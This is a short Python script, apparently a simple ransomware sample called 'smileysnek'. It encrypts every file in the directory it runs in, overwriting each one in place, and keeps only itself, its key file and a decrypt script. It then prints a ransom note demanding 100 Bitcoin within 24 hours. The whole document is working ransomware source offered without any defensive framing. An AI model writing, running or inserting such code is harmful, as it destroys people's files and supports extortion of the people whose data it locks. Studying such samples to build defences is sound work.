#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet

# 1. Gather files to encrypt
files = []
for file in os.listdir():
    if file in ('smileysnek.py', 'key.key', 'decrypt.py'):
        continue
    if os.path.isfile(file):
        files.append(file)

# 2. Generate encryption key
key = Fernet.generate_key()
with open('key.key', 'wb') as key_file:
    key_file.write(key)

fernet = Fernet(key)

# 3. Encrypt each file
for file in files:
    with open(file, 'rb') as f:
        contents = f.read()

    encrypted = fernet.encrypt(contents)

    with open(file, 'wb') as f:
        f.write(encrypted)

print("All of your files have been constricted. Send me 100 Bitcoin or I'll swallow them whole, you have 24 hours.")
